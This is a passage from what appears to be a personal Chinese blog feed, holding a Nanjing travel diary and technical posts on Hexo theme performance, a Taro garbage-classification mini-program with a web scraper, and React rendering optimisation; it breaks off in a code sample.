<p>老门东建筑主要沿用徽州风格，青砖黛瓦，有许多游客在这儿架单反。门口立着明城墙，城墙下淌着秦淮河，公交车从城墙中穿过。</p>
<p>我还是挺喜欢这些半商业化街区的，有东西吃，又不喧闹，还能接受文化局和小酒馆“安排”的文化熏陶。</p>
<p><strong>02</strong></p>
<p>晚上，我们沿着秦淮河散步，逛到了夫子庙。</p>
<p><img  src="https://pic.izhaoo.com/20201112102229.jpg"  ><span class="image-caption">夫子庙</span></p>
<p>夫子庙的商业氛围就很浓厚了，整条街都是游客和小吃店，小吃只有三种，盐水鸭、鸭血粉丝汤、全国特色小吃。</p>
<p>走啊走，感受着繁华，这儿千百年来一直很繁华。“商女不知亡国恨，隔江犹唱后庭花。”时过境迁，青楼不复，商女不在，几多遗憾。</p>
<p><img  src="https://pic.izhaoo.com/20201124151428.jpg"  ><span class="image-caption">绍兴臭豆腐</span></p>
<p>在街角发现一家“咸亨酒店”，吃到了家乡美食，绍兴臭豆腐！抬头一看，这条街叫乌衣巷。</p>
<p><img  src="https://pic.izhaoo.com/2020112802044.jpg"  ><span class="image-caption">转运珠</span></p>
<p>在一家专坑游客的店买了两串“转运珠”，真TM灵，好运直接转厄运，故事就从这里开始了……</p>
<p><strong>03</strong></p>
<p><img  src="https://pic.izhaoo.com/20201112102448.jpg"  ><span class="image-caption">明孝陵</span></p>
<p>本想看秋叶下的皇陵，奈何人比了落叶多。</p>
<p><img  src="https://pic.izhaoo.com/2020112885714.jpg"  ><span class="image-caption">古鸡鸣寺</span></p>
<p>我不信佛，佛也不渡共产党人。既然牵着小潘同学的手走进来了，就要相信事在人为。</p>
<p><img  src="https://pic.izhaoo.com/20201112112210.jpg"  ><span class="image-caption">南京剪影</span></p>
<p>湖边城楼看南京，无高楼。</p>
<p><img  src="https://pic.izhaoo.com/20201112102133.jpg"  ><span class="image-caption">先锋书店</span></p>
<p>打卡网红书店，一家只谈风月的文艺书店。</p>
<p><strong>04</strong></p>
<p><img  src="https://pic.izhaoo.com/20201112102432.jpg"  ><span class="image-caption">总统府</span></p>
<p>红旗插上总统府。</p>
<p><img  src="https://pic.izhaoo.com/2020112893341.jpg"  ><span class="image-caption">野橘</span></p>
<p>在总统府路遇野橘，神智不灵清的亚子。用娴熟的手法给你来个360°马杀鸡，爽到屁股都翘起来。小潘同学伸出手，想要给你一个拥抱，却被你反手一爪子，留下两道爪子一滴血。</p>
<p><img  src="https://pic.izhaoo.com/1606573805408.jpg"  ><span class="image-caption">南京第二医院</span></p>
<p>马上去打了一针狂犬疫苗，没想到在南京的最后一站居然是<em>南京第二医院</em>。打完针已经是晚上八点了，很遗憾地错过了高铁，火速赶到高铁站，更遗憾地当日改签票已售罄。最后只能买了两张绿皮硬卧，连夜逃回杭州！</p>
<p><strong>05</strong></p>
<p><img  src="https://pic.izhaoo.com/2020110822160401.jpeg"  ><span class="image-caption">我离开了南京，从此不想再来。</span></p>
<p>列车缓缓驶出南京站，我从歌单翻出这首没有作者的歌，小提琴安抚了我心中的一万只草泥马。</p>
<p><img  src="https://pic.izhaoo.com/20201128104800.jpg"  ><span class="image-caption">列车上的生活</span></p>
<p>这是我第二次体验绿皮，第一次在上海。两次都是同一辆车，<strong>K1805</strong>，一列从银川来的，行驶三天三夜的绿皮。</p>
<p>车上有旅行的大学生，失恋的小伙子，一路骚话的中年妇女，横在凳子上的大叔，一对落魄的情侣……</p>
<p>两点，补了张卧铺。晚安，苏州。</p>
<p><img  src="https://pic.izhaoo.com/20201128104820.jpg"  ><span class="image-caption">早安，杭州。</span></p>
<p>杭州快要到了，请各位旅客做好准备，期待与您下一次相遇。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>旅行</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 性能优化之旅</title>
    <url>/2020/08/08/hexo-performance-optimization/</url>
    <content><![CDATA[<p>看不见的地方一样重要，主题性能优化相关专题。</p>
<span id="more"></span>

<p>前几天面试问了性能优化，好久没关注这块了，许多操作就想不起来，很尴尬……</p>
<p>所以本文总结一下 <code>hexo-theme-zhaoo</code> 主题中做的一些性能优化，主要从 <strong>用户体验</strong> 、<strong>网络请求</strong> 、<strong>视图渲染</strong> 三方面入手，作者借此复习一下，逃。</p>
<h2 id="用户体验"><a href="#用户体验" class="headerlink" title="用户体验"></a>用户体验</h2><p>在做性能优化的时候，我们总是会关注各种指标：请求速度、渲染速度、白屏时间……这些优化固然重要，但是我们往往会忽略 <strong>用户体验</strong>，从用户角度来看可能体验才是最重要的。</p>
<p>试想：你的网站刚上线，并没有做任何优化，此时首屏加载时间需要 <em>8s</em> 。很遗憾，大多数用户没有这个耐心等待，会选择点击右上角的 <strong>X</strong> ，并且拉入了“黑名单”。这样可不行，然后你就做了一些常规优化，轻轻松松就将首屏加载时间拉到了 <em>2s</em> ，用户粘性就上来了。这时候你还不满足，执着于各种性能指标，通过一套“牛X”的算法把加载时间优化到了 <em>1.5s</em> 。过程可能很艰辛，但是结果却不是很理想，因为对于大多数用户来说可能根本感受不到这 <em>0.5s</em> 之间的差别。当你绝望的时候，UI小姐姐甩过来一张 <code>Loading</code> 图，你随手一加，结果用户量猛增。</p>
<p>从用户心理角度来说，从按下回车到首屏展示这段时间（白屏），他是最不安的，觉得这个网站随时可能挂掉。你甩出一个 <code>Loading</code> 动画让他“欣赏”，他起码会觉得这个网站还在动，大不了多看会儿嘛。</p>
<p>所以我们做优化的时候要兼顾 <strong>用户体验</strong> ，而不是一昧的追求速度。</p>
<h3 id="Loading"><a href="#Loading" class="headerlink" title="Loading"></a>Loading</h3><p>思路很简单，页面头部首先加载 <code>Loading</code> 遮罩图（HTML + CSS），在页面底部加载 <code>JS</code> 后，通过 <code>JS</code> 把 <code>Loading</code> 遮罩移除即可。</p>
<p>考虑到用户体验，提供一个较为稳定的动画时间，而不是一闪而过，所以给了 <em>0.5s</em> 延时。同时埋了个点，可以在 <code>_config.yml</code> 中配置自己的 <code>Loading</code> 效果。</p>
<p><img  src="https://pic.izhaoo.com/20200809144612.png"  ><span class="image-caption">loading</span></p>
<h3 id="渐进动画"><a href="#渐进动画" class="headerlink" title="渐进动画"></a>渐进动画</h3><h2 id="网络请求"><a href="#网络请求" class="headerlink" title="网络请求"></a>网络请求</h2><h3 id="Promise-并发控制"><a href="#Promise-并发控制" class="headerlink" title="Promise 并发控制"></a>Promise 并发控制</h3><p>这是一道“字节”必考题，面经背了学以致用吧。</p>
<p>主题使用 <code>leancloud</code> 来存储浏览量（PV），在进入页面的时候会并发请求获取浏览量。会产生以下问题：1. 并发请求会被服务器阻塞，返回 <code>429</code> 错误。2. 由于请求被阻塞了，页面渲染也被JS引擎阻塞了，产生 <em>1s</em> 左右的延迟。</p>
<p><img  src="https://pic.izhaoo.com/20200828111132.jpg"  ><span class="image-caption">429</span></p>
<p><img  src="https://pic.izhaoo.com/20200828111143.jpg"  ><span class="image-caption">429</span></p>
<p>为了解决这一问题，我们可以引入 <code>Promise</code> 并发控制请求流量，控制一次性不会涌入大量请求。</p>
<p><img  src="https://pic.izhaoo.com/20200828112220.png"  ><span class="image-caption">并发控制</span></p>
<p><img  src="https://pic.izhaoo.com/20200828112255.png"  ><span class="image-caption">调用方式</span></p>
<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>静态资源从服务器下载到用户主机，需要经过许多路由，一般距离越远，速度越慢。<strong>CDN（内容分发网络）</strong> 就是将资源部署到空间分布于各地的服务器上，用户访问时从就近的服务器拉取资源，起到加速作用。还可充当 <strong>负载均衡</strong> 、 <strong>缓存备份</strong> 功能。<del>（以上是官方说法，我们哪来那么大的流量，纯粹是因为学生服务器太渣了，上行速度实在是太慢，架不住资源）</del></p>
<p><code>CDN</code> 直接用云服务商的就好了，阿里云、腾讯云、七牛云、又拍云…… 好，我选择免费的七牛云，<code>HTTPS</code> 每个月也就五毛钱。</p>
<p>部署方式很简单，创个账号，建个空间，绑个域名，传个文件，网上一堆教程。</p>
<p>推荐一个图床工具：<a href="https://github.com/Molunerfinn/PicGo">PicGo</a>、<a href="https://github.com/PicGo/vs-picgo">vs-picgo</a></p>
<p><code>VSCode</code> 版很方便。众所周知：<code>VSCode</code> 除了码代码啥都可以干。</p>
<p>另外，<code>JS</code> 和 <code>CSS</code> 等静态资源，我们就不用存自己的 <code>CDN</code> 空间了，<a href="https://www.bootcdn.cn/">BootCDN</a> 更方便。我在主题埋了个点，直接填写链接即可，不填默认从本地获取。</p>
<p><img  src="https://pic.izhaoo.com/20200809135101.png"  ><span class="image-caption">BootCDN</span></p>
<h3 id="Gzip"><a href="#Gzip" class="headerlink" title="Gzip"></a>Gzip</h3><p>服务器层面，应该开启 <code>Gzip</code> 压缩，能将文件资源体积压缩到原来的 <strong>1/4</strong> 。注意不要对图片资源进行压缩，适得其反，所以在配置项 <code>gzip_types</code> 中进行选择。</p>
<p><img  src="https://pic.izhaoo.com/20200809150928.png"  ><span class="image-caption">gzip</span></p>
<p><img  src="https://pic.izhaoo.com/20200809145713.jpg"  ><span class="image-caption">gzip</span><br>  <div align="center"><p>（宝塔面板偷个懒）</p></div></p>
<h3 id="async-defer"><a href="#async-defer" class="headerlink" title="async / defer"></a>async / defer</h3><p>【亲测效果很好】</p>
<p>我们知道，<strong>GUI渲染线程</strong> 和 <strong>JS引擎线程</strong> 是互斥的，同时执行会导致渲染混乱，所以默认将他们分离执行。运行到 <code>&lt;script&gt;</code> 标签（包括加载脚本）时会暂停渲染，浪费了一些性能。（这也是我们提倡将 <code>&lt;style&gt;</code> 放在头部，将 <code>&lt;script&gt;</code> 放在底部的原因之一）</p>
<p>为了压榨性能呢，<code>w3c</code> 为我们提供了两个属性：<code>async</code> 、 <code>defer</code>，可以帮助我们异步加载脚本。（周立齐：执行异步是不可能，这辈子都不可能的）</p>
<ul>
<li>default：同步加载脚本</li>
<li>aysnc：异步加载脚本，加载完马上执行</li>
<li>defer：异步加载脚本，页面渲染后执行</li>
</ul>
<p>盗了张图，一图胜千言：</p>
<p><img  src="https://pic.izhaoo.com/20200809152145.jpg"  ><span class="image-caption">async/defer</span></p>
<p>优化思路：</p>
<ol>
<li>把一些渲染过程中用不到的第三方脚本打上 <code>defer</code> ，拖到渲染后执行。</li>
<li>把渲染中需要使用的脚本打上 <code>async</code> ，异步加载。（需要注意顺序，不要打乱执行流程）</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20200811163325.png"  ><span class="image-caption">async/defer</span></p>
<p>优雅一点嘛~</p>
<p><img  src="https://pic.izhaoo.com/20200811163117.png"  ><span class="image-caption">async/defer</span></p>
<p>像 <strong>评论</strong> 、 <strong>请求统计</strong> 、 <strong>DaoVoice</strong> 这些第三方脚本加载巨慢，特别是 <code>leancloud</code> ，延迟大约 <em>1s</em> 多，严重拖慢了渲染速度。套上 <code>async/defer</code> 之后感觉棒棒哒~</p>
<h3 id="loadScript"><a href="#loadScript" class="headerlink" title="loadScript"></a>loadScript</h3><p>一些例如 <strong>实例化</strong> 、 <strong>挂载</strong> 等执行逻辑，需要依赖前置脚本加载完后才能执行。这时候如果给它俩都套上了 <code>async/defer</code> ，异步执行顺序就会不可控，会报一些 <code>underfined</code> 之类的错。</p>
<p>所以我们需要改造一下，让它们链式触发。最简单的思路就是借助回调函数了，可以直接使用 <code>jQuery</code> 的 <code>$.ajax()</code> 实现。但是我后期考虑移除 <code>jQuery</code>，还是自己封装一下吧。</p>
<p>最简单的加载方式是 <code>loadScript</code> ，通过操纵 <code>DOM</code> ， <code>append</code> 一个 <code>&lt;script&gt;</code> 标签来加载资源。</p>
<p><img  src="https://pic.izhaoo.com/20200811164119.png"  ><span class="image-caption">loadScript</span></p>
<p>食用方式：</p>
<p><img  src="https://pic.izhaoo.com/20200811164005.png"  ><span class="image-caption">loadScript</span></p>
<h3 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h3><p>阿贾克斯年代了， <code>loadScript</code> 也太逊了吧…… </p>
<p>之后可能会考虑移除 <code>jQuery</code>， 那就先封装一个 <code>Ajax</code>吧：</p>
<h3 id="PJAX"><a href="#PJAX" class="headerlink" title="PJAX"></a>PJAX</h3><p>这是个反面教材……</p>
<p><code>PJAX</code> 可以理解为 <code>AJAX</code> 的升级版。<code>AJAX</code> 只是简单的异步请求资源，一般用于局部无刷新加载，如果用于整页加载会造成 <code>URL</code> 无法更新，从而影响 <code>SEO</code> 和 回退操作。而 <code>PJAX</code> 基于 <code>AJAX</code> 和 <code>pushState</code> （其实就是前端路由那两套方案），可以改变 <code>URL</code>，可以提供了整页无刷新加载。</p>
<h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><h3 id="PWA"><a href="#PWA" class="headerlink" title="PWA"></a>PWA</h3><h2 id="视图渲染"><a href="#视图渲染" class="headerlink" title="视图渲染"></a>视图渲染</h2><h3 id="静态脚本移到编译阶段"><a href="#静态脚本移到编译阶段" class="headerlink" title="静态脚本移到编译阶段"></a>静态脚本移到编译阶段</h3><h3 id="减少重绘回流"><a href="#减少重绘回流" class="headerlink" title="减少重绘回流"></a>减少重绘回流</h3><h3 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h3><p>懒加载就是图片延迟加载，先套个占位图，等图片 <em>进入视口后</em> 或者 <em>快进入时候时（通过加一定高度预判，预加载）</em> 才加载并渲染图片。</p>
<p>实现思路：</p>
<ol>
<li>在编译阶段进行劫持，将 <code>HTML</code> 中的 <code>img</code> 标签中的 <code>src</code> 图片地址保存到 <code>data-src</code> 进行缓存，同时替换为占位图（Loading）。<br><img  src="https://pic.izhaoo.com/20200809160254.png"  ><span class="image-caption">编译替换</span></li>
<li>运行阶段，图片进入视口后，再将 <code>src</code> 替换为 <code>data-src</code> 加载图片。<div align="center">
 <img  src="https://pic.izhaoo.com/20200809161341.png"  ><span class="image-caption">懒加载</span>
 <p>（暂时用了第三方懒加载库，立个Flag，日后定要造个轮子）</p>
</div>

</li>
</ol>
<h3 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h3>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>主题</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>口袋拾荒 - 垃圾分类助手</title>
    <url>/2020/08/02/ai-garbage-classification/</url>
    <content><![CDATA[<p>基于 <code>Taro</code> 开发的垃圾分类辅助小程序，支持拍照识别、关键词搜索、字典检索等功能。</p>
<span id="more"></span>

<p>&lt;封面摄于浙江·杭州的西溪湿地，与小潘同学秋游。&gt;</p>
<blockquote>
<p>GitHub: <a href="https://github.com/izhaoo/garbage-classification">garbage-classification</a></p>
</blockquote>
<div align="center">
  <img  src="https://pic.izhaoo.com/1596359686072.jpg"   width="350" /><span class="image-caption">口袋拾荒</span>
</div>

<h3 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h3><ul>
<li>小程序: Taro, GraphQL (Apollo), TypeScript, React (Hooks), Canvas</li>
<li>后台: AntDesign, TypeScript, React</li>
<li>服务端: Nest.js, Mongoose, GraphQL （Apollo）, TypeScript, 百度AI</li>
<li>爬虫: cheerio, superagent, Koa, Mongoose</li>
</ul>
<h5 id="Taro-图片（URL）-转-base64"><a href="#Taro-图片（URL）-转-base64" class="headerlink" title="Taro 图片（URL） 转 base64"></a>Taro 图片（URL） 转 base64</h5><p><strong>百度AI</strong> 接口接受 <code>base64</code> 形式的图片，并且识别主体内容和轮廓。所以我们需要通过相机拍照，以 <code>base64</code> 的形式上传到服务端。然而 <code>Taro.createCameraContext</code> 返回的是图片在本地缓存地址，而不是图片文件，无法转换为 <code>base64</code>，<code>Taro</code> 中也没相应的文档。后来发现，原来 <code>Taro</code> 是小程序的子集，在 <code>Taro</code> 中也能使用 <code>wx API</code>。</p>
<pre><code class="javascript">// func.ts

export function url2base64(url) &#123;
  return new Promise((resolve, reject) =&gt; &#123;
    wx.getFileSystemManager().readFile(&#123;
      filePath: url,
      encoding: &#39;base64&#39;,
      success: res =&gt; &#123;
        resolve(res.data)
      &#125;,
      fail: (err) =&gt; &#123;
        reject(err)
      &#125;
    &#125;)
  &#125;)
&#125;</code></pre>
<pre><code class="javascript">// page.ts

import &#123;url2base64&#125; from &#39;~/func.js&#39;

onCamera = () =&gt; &#123;
  const ctx = Taro.createCameraContext()
  ctx.takePhoto(&#123;
    quality: &#39;high&#39;,
    success: async res =&gt; &#123;
      const base64 = await url2base64(res.tempImagePath)
      const &#123; width, height &#125; = await Taro.getImageInfo(&#123; src: res.tempImagePath &#125;)
      this.handleCanvas(base64, res.tempImagePath, &#123; width, height &#125;)
    &#125;
  &#125;)
&#125;</code></pre>
<h5 id="Canvas-绘制物品轮廓（自适应设备）"><a href="#Canvas-绘制物品轮廓（自适应设备）" class="headerlink" title="Canvas 绘制物品轮廓（自适应设备）"></a>Canvas 绘制物品轮廓（自适应设备）</h5><blockquote>
<p><a href="https://cloud.tencent.com/developer/article/1352187">细说移动端 经典的REM布局 与 新秀VW布局</a></p>
</blockquote>
<p>将图片转为 <code>base64</code> 后就可以请求 <code>百度AI</code> 了，成功识别出了物品的名称（text），轮廓（四个坐标点），现在需要通过 <code>Canvas</code> 将它们绘制在画布中。</p>
<p>遇到一个问题：图片在微信小程序IDE中调试没问题，但是一旦传到真机调试，比例就会失调，主要是因为文字和轮廓受设备分辨率影响进行了偏移。</p>
<p>之前看过一篇文章，有个概念：<code>设备像素比 ＝ 物理像素 / 设备独立像素</code>。这里的偏移就是 <code>dpr</code> 导致的，所以我们只需要计算出 <code>dpr</code>，再将它缩放回来即可。（机智如我）</p>
<p>通过以下代码可以获取页面的实际尺寸：</p>
<pre><code class="javascript">const window = Taro.getSystemInfo()
const w = window.windowWidth
const h = window.windowHeight</code></pre>
<p>再将 <strong>页面尺寸</strong> 与 <strong>照片尺寸</strong> 做个除法计算即可：</p>
<pre><code class="javascript">handleCanvas = (base64, src, photo) =&gt; &#123;
  //获取设备实际尺寸
  const w = res.windowWidth
  const h = res.windowHeight - 90
  //计算缩放比
  const scale = &#123;
    w: w / photo.width,
    h: h / photo.height
  &#125;
  const ctx = Taro.createCanvasContext(&#39;canvas&#39;, this.$scope)
  Taro.getSystemInfo(&#123;
    success: async res =&gt; &#123;
      // 渲染图片
      ctx.drawImage(src, 0, 0, w, h)
      // 主体识别，获得轮廓
      const subject: any = await baiduSubjectDetection(this.state.baiduToken, &#123;
        image: base64
      &#125;)
      const &#123; height, width, top, left &#125; = subject.result
      // 内容识别，获得物品名称
      const advance: any = await baiduAdvancedGeneral(this.state.baiduToken, &#123;
        image: base64
      &#125;)
      const &#123; keyword &#125; = advance.result[0]
      //渲染轮廓和尺寸
      this.setState(&#123; keyword: keyword &#125;)
      ctx.setStrokeStyle(&quot;#00ff00&quot;)
      ctx.setLineWidth(2)
      ctx.rect(left, top, width, height)
      //适配屏幕尺寸进行缩放
      ctx.scale(scale.w, scale.h)
      ctx.setFillStyle(&quot;#00ff00&quot;)
      ctx.setFontSize(18 / scale.w)
      ctx.fillText(keyword, left, (top + 30))
      ctx.stroke()
      ctx.draw()
    &#125;
  &#125;)
&#125;</code></pre>
<h5 id="Canvas-绘制海报并保存到相册"><a href="#Canvas-绘制海报并保存到相册" class="headerlink" title="Canvas 绘制海报并保存到相册"></a>Canvas 绘制海报并保存到相册</h5><p>推广页面的二维码海报也是用 <code>Canvas</code> 绘制的，实现了长按图片保存到相册功能，代码如下：</p>
<pre><code class="javascript">//获取画布尺寸
const window = Taro.getSystemInfoSync()
const w = window.windowWidth * 0.8
const h = window.windowWidth * 0.8 * 9 / 5

//保存海报到相册
const handleSaveImage = async () =&gt; &#123;
  //将 canvas 保存到缓存中
  let res = await Taro.canvasToTempFilePath(&#123;
    x: 0,
    y: 0,
    width: w,
    height: h,
    canvasId: &#39;canvas&#39;,
    fileType: &#39;png&#39;
  &#125;)
  //将缓存中的图片保存到相册中
  let saveRes = await Taro.saveImageToPhotosAlbum(&#123;
    filePath: res.tempFilePath
  &#125;)
  if (saveRes.errMsg === &#39;saveImageToPhotosAlbum:ok&#39;) &#123;
    Taro.showToast(&#123;
      title: &#39;图片已保存到相册&#39;
    &#125;)
  &#125; else &#123;
    Taro.showToast(&#123;
      title: &#39;保存失败&#39;
    &#125;)
  &#125;
&#125;

const renderCanvas = (text = &#39;快来扫一扫吧&#39;) =&gt; &#123;
  const ctx = Taro.createCanvasContext(&#39;canvas&#39;, null)
  //背景铺满
  ctx.drawImage(background, 0, 0, w, h)
  ctx.setFillStyle(&quot;#ffffff&quot;)
  //文字居中
  ctx.setFontSize(22)
  ctx.setTextAlign(&#39;center&#39;)
  ctx.fillText(&#39;口袋拾荒&#39;, w / 2, h - 200)
  ctx.setFontSize(12)
  ctx.fillText(`- $&#123;text&#125; -`, w / 2, h - 180)
  ctx.draw()
&#125;</code></pre>
<p>by the way，文字居中官方文档中是用 <code>setTextAlign(&#39;center&#39;)</code> 实现的，但是实际却没有效果。因为它是以整个画布的宽度的一半的中心轴为基准线，我们还需要将文字的横轴移到画布中心轴：<code>ctx.fillText(text, w / 2, h)</code>。</p>
<h5 id="数据爬虫"><a href="#数据爬虫" class="headerlink" title="数据爬虫"></a>数据爬虫</h5><p>爬虫功能很简单，用 <strong>superagent</strong> 库请求网站获取 <code>html</code> 文档，再用 <strong>cheerio</strong> 库解析标签清洗数据，最后用 <strong>mongoose</strong> 存到数据库中。</p>
<pre><code class="javascript">//爬取数据
const superagent = require(&#39;superagent&#39;)
const cheerio = require(&#39;cheerio&#39;)

class Eight &#123;
  constructor() &#123;
    this.url = &#123;
      other: &#39;https://www.8684.cn/ljfl_glj&#39;,
      food: &#39;https://www.8684.cn/ljfl_slj&#39;,
      harmful: &#39;https://www.8684.cn/ljfl_yhlj&#39;,
      recyclable: &#39;https://www.8684.cn/ljfl_khslj&#39;
    &#125;
  &#125;

  parse = (body) =&gt; &#123;
    const $ = cheerio.load(body.text)
    let arr = []
    $(&#39;.list-col4 li a&#39;).each((index, ele) =&gt; &#123;
      arr.push($(ele).text())
    &#125;)
    return arr
  &#125;

  run = async () =&gt; &#123;
    const &#123; url, parse &#125; = this
    let data = []
    for (const i in url) &#123;
      const res = await superagent.get(url[i])
      data.push(&#123;
        key: i,
        value: parse(res)
      &#125;)
    &#125;
    return data
  &#125;
&#125;

exports.Eight = Eight</code></pre>
<pre><code class="javascript">//存到数据库

const Koa = require(&#39;koa&#39;)
const app = new Koa()
const mongoose = require(&#39;mongoose&#39;)
const &#123; Eight &#125; = require(&#39;./source&#39;)

const config = &#123;
  hostname: &#39;localhost&#39;,
  port: 3000,
&#125;

app.use(async ctx =&gt; &#123;
  ctx.body = &#39;Hello World&#39;
&#125;)

app.listen(config.port, config.hostname)

console.info(&#39;Server is running at http://%s:%s . Press Ctrl+C to stop.&#39;, config.hostname, config.port)

mongoose.connect(&#39;mongodb://localhost/garbage&#39;)

const Garbage = mongoose.model(&#39;Garbage&#39;, &#123; name: String, categoryId: String &#125;);

const eight = new Eight()
eight.run().then(res =&gt; &#123;
  const data = res[0].value
  for (const i of data) &#123;
    Garbage.create(&#123;name:i, categoryId: &#39;5e427fe8558c2a31cd450fbc&#39;&#125;)
  &#125;
&#125;)</code></pre>
<h5 id="Taro-封装-Apollo-请求库"><a href="#Taro-封装-Apollo-请求库" class="headerlink" title="Taro 封装 Apollo 请求库"></a>Taro 封装 Apollo 请求库</h5><p>简单封装一下 <code>GraphQL</code> 请求库，方便调用。</p>
<pre><code class="javascript">// /api/graphql.ts

import Taro from &#39;@tarojs/taro&#39;
import ApolloClient from &#39;apollo-boost&#39;

const uri = &#39;https://xxx.com/graphql&#39;

const fetch = (url, &#123; body: data, ...fetchOptions &#125;) =&gt; &#123;
  return Taro.request(&#123; url, data, ...fetchOptions, dataType: &#39;txt&#39;, responseType: &#39;text&#39; &#125;)
    .then((res) =&gt; &#123;
      res.text = () =&gt; Promise.resolve(res.data)
      return res
    &#125;).catch(error =&gt; &#123;
      console.error(error)
    &#125;,
  );
&#125;

export default new ApolloClient(&#123; uri, fetch &#125;)</code></pre>
<pre><code class="javascript">// /api/gql.ts

import &#123; gql &#125; from &#39;apollo-boost&#39;

export const category = gql`
  query &#123;
    category &#123;
      name
      id
      image
    &#125;
  &#125;
`</code></pre>
<pre><code class="javascript">// page.ts

import &#123; category &#125; from &#39;~/api/gql&#39;

const res = await graphql.query(&#123; query: category &#125;)</code></pre>
<h3 id="真机调试内网穿透"><a href="#真机调试内网穿透" class="headerlink" title="真机调试内网穿透"></a>真机调试内网穿透</h3><p>详见该文章 -&gt; <a href="https://www.izhaoo.com/2020/02/12/weapp-debug-https/">小程序真机调试问题</a></p>
]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>React - 渲染性能优化</title>
    <url>/2020/08/01/react-render-optimization/</url>
    <content><![CDATA[<p>总结避免子组件不必要渲染的一些方法。</p>
<span id="more"></span>

<blockquote>
<p>水文预警：看题目就知道，这篇是水文，写给自己的备忘录。</p>
</blockquote>
<p>在 <code>React</code> 中，父组件一旦渲染，子组件也会跟着重新渲染。（父债子还）</p>
<p>试想在复杂业务场景下，一群子组件依赖于父组件，然后父组件有逻辑触发了渲染，一群子组件跟着渲染，这不是炸了。（杀鸡用牛刀）</p>
<p>所以 <code>React</code> 性能优化的要素就是打断父子组件之间的强依赖关系，跳过不必要的重新渲染。但是当属性更新时，子组件又能进行及时响应并渲染。（指哪打哪）</p>
<p>本文讨论在子组件控制重新渲染的一些方法。</p>
<h3 id="shouldComponentUpdate"><a href="#shouldComponentUpdate" class="headerlink" title="shouldComponentUpdate"></a>shouldComponentUpdate</h3><p><code>shouldComponentUpdate</code> 是一个生命周期，在组件更新阶段中触发，用于判断组件是否需要渲染。</p>
<p>组件更新：componentWillReceiveProps（接收属性） -&gt; <strong>shouldComponentUpdate（判断是否渲染）</strong> -&gt; componentWillUpdate -&gt; render（重新渲染） -&gt; componentDidUpdate</p>
<pre><code class="javascript">shouldComponentUpdate(nextProps, nextState) &#123;
  if (nextProps.user === this.props.user) &#123;  //属性没有改变
    return false;  //不渲染
  &#125; else &#123;
    return true;  //渲染
  &#125;
&#125;

//简写
shouldComponentUpdate(nextProps, nextState) &#123;
  return nextProps !== this.props;
&#125;</code></pre>
<p>该生命周期方法接收两个变量，表示下一次渲染后的属性和变量；返回一个布尔值表示是否需要渲染。</p>
<p>在方法中我们可以对 <code>nextProps（更新后属性）</code> 、 <code>this.props （当前属性）</code> 、 <code>nextState（更新后状态）</code> 、 <code>this.state （当前状态）</code> 进行一些判断，来决定是否需要重新渲染。当父组件传给子组件的属性没有发生变化时，子组件自然就不用重新渲染了，就达到了性能优化的效果。</p>
<p>但是需要注意的是，深比较（递归遍历对象下面的所有属性）可能得不偿失，一套比较下来还要渲染，还不如直接渲染来的快。</p>
<p>所以正确的食用方法如下：</p>
<ul>
<li>只进行浅比较，对比引用对象即可：<code>nextProps === this.props</code></li>
<li>进行深层次控制，比如只对比其中一部分属性：<code>nextProps.username === this.props.username</code></li>
<li>将对象转化为 <code>immutable</code> 对象进行比较。<del>但是 <code>js</code> 转 <code>immutable</code> 再转回 <code>js</code> 太麻烦了</del></li>
</ul>
<blockquote>
<p><code>immutable.js</code> 是不可变数据集合，数据一旦创建就不能被修改，可以进行高效的惰性比较。</p>
</blockquote>
<h3 id="PureComponent"><a href="#PureComponent" class="headerlink" title="PureComponent"></a>PureComponent</h3><p>每个子组件都写一通 <code>shouldComponentUpdate</code> 也太麻烦了，所以 <code>React</code> 为我们准备了 <code>PureComponent</code> 组件，原型对象中默认实现了 <strong>浅比较</strong> 。</p>
<p>By the way，若是在 <code>PureComponent</code> 使用了 <code>shouldComponentUpdate</code> ，该方法会被重写。</p>
<pre><code class="javascript">import React, &#123;PureComponent&#125; from &#39;react&#39;;

export default class Child extends PureComponent&#123;  //默认进行浅比较，决定是否重渲染
  render() &#123;
    return (
      ...
    )
  &#125;
&#125;</code></pre>
<p>上述两种方式只适用于 <strong>对象式组件</strong>，对于 <strong>函数式组件</strong> 需要使用以下方法：</p>
<h3 id="memo"><a href="#memo" class="headerlink" title="memo"></a>memo</h3><p><code>React.memo()</code> 是一个 HOC（高阶组件），传入两个参数：函数式组件、判断方法，返回被包裹后的对象。通过判断方法中返回的结果来决定是否需要重新渲染。</p>
<p>第二个参数也可以不传，默认就是浅比较。</p>
<pre><code class="javascript">import React, &#123; memo &#125; from &#39;react&#39;;

const isEqual = (prevProps, nextProps) =&gt; &#123;
  return prevProps !== nextProps;
&#125;

export default memo((props = &#123;&#125;) =&gt; &#123;
  return (
    ...
  );
&#125;, isEqual);</code></pre>
<p>使用 <code>Hooks</code> 特性后，<code>React.memo()</code> 方法就失效了。因为每次渲染返回的都是一个新闭包，不管怎么比较都是重新渲染。</p>
<p>贴心的 <code>React</code> 团队提供了以下两个 <code>Hooks</code> 方法：</p>
<h3 id="useMemo"><a href="#useMemo" class="headerlink" title="useMemo"></a>useMemo</h3><p><code>useMemo</code> 接受两个参数：函数 和 依赖项数组，返回缓存 <code>memoized</code> 值（个人理解是包装后的对象）。只有当依赖性数组中的某个值发生变化时，该函数才会重新渲染。</p>
<p><code>useMemo</code> 的控制粒度更细，控制的是传入的函数，而不是整个组件。</p>
<pre><code class="javascript">import React, &#123; useState, useMemo &#125; from &#39;react&#39;;

export default Father = (props = &#123;&#125;) =&gt; &#123;
  const [username, setUsername] = useState(&#39;zhaoo&#39;);
  return (
    &lt;&gt;
      &lt;Child username=&#123;username&#125; /&gt;
